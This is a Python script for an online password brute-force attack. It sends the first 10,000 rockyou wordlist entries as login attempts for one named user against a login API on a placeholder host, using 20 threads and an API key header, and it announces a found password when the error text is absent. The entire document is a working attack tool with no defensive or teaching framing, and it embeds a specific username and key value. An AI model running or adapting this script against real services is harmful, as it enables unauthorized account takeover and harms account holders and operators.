import requests
from concurrent.futures import ThreadPoolExecutor
import itertools
import threading
from tqdm import tqdm

TARGET = "https://your-target.com/api-key/user/login/dep"
USERNAME = "cpc.eliaschm"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
API_KEY = "YXBpY2hpbmdvbmVyaWFkZWNoaW5nb25lcmlhcw"
THREADS = 20
LIMIT = 10000

HEADERS = {
    "Content-Type": "application/json",
    "apikey": API_KEY
}

found = False
lock = threading.Lock()

def try_password(args):
    global found
    password, progress = args
    if found:
        progress.update(1)
        return

    payload = {"userName": USERNAME, "password": password}
    try:
        r = requests.post(TARGET, json=payload, headers=HEADERS, timeout=5)
        if "Invalid oaut" not in r.text:
            with lock:
                print(f"\n[+] FOUND! Password: {password}")
                print(f"    Response: {r.text}")
                found = True
        else:
            pass  # tqdm handles the display
    except requests.exceptions.RequestException as e:
        with lock:
            print(f"\n[!] Error on '{password}': {e}")
    finally:
        progress.update(1)

with open(WORDLIST, "r", encoding="latin-1") as f:
    passwords = list(itertools.islice((l.strip() for l in f), LIMIT))

print(f"[*] Starting attack on {TARGET}")
print(f"[*] User: {USERNAME} | Passwords: {len(passwords)} | Threads: {THREADS}\n")

with tqdm(total=len(passwords), unit="pwd", ncols=70, colour="green") as progress:
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(try_password, [(p, progress) for p in passwords])

if not found:
    print("\n[-] Password not found in the first 10k.")
